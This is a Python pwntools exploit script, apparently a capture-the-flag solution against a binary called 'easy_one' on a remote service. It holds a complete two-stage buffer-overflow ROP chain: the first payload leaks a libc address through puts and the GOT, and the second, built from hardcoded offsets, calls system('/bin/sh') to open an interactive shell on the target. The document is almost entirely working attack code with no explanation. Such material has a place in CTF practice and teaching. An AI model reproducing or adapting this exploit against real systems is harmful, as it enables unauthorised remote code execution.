from pwn import *

p = process('./easy_one')
p = remote('get-it.darkarmy.xyz', 7001)
uu64    = lambda data               :u64(data.ljust(8, '\0'))


puts_plt = p64(0x0401040)
puts_got = p64(0x404020)
pad = 'A' * 72
pop_rdi_ret = p64(0x00000000004013bb)
ret = p64(0x0000000000401016)
vuln = p64(0x040133d)
raw_input('test')
payload1 = ''
payload1 += pad
payload1 += pop_rdi_ret
payload1 += puts_got
payload1 += puts_plt
payload1 += vuln

p.sendlineafter('this.\n',payload1)
leak = uu64(p.recv(6))
system = leak - 0x31550
bin_sh = leak + 0x1336ca

payload2 = ''
payload2 += pad
payload2 += pop_rdi_ret
payload2 += p64(bin_sh)
payload2 += ret
payload2 += p64(system)

p.sendline(payload2)

p.interactive()
